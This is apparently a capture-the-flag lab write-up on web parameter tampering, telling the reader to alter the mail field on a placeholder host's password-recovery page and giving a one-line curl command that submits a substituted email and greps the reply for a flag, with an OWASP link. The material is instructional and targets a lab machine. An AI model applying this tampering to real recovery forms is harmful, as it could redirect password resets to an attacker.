# Web Parameter Tampering

Go to the `http://$IPADDR/?page=recover` and change mail to another.

<details>
    <summary>Shell script that does the trick</summary>

```bash
curl -s -F "mail=M&L@ya.ru" -F "Submit=Submit" "http://IPDADDR/?page=recover" | grep flag
```

</details>

## References
Follow [this](https://owasp.org/www-community/attacks/Web_Parameter_Tampering) page for more details.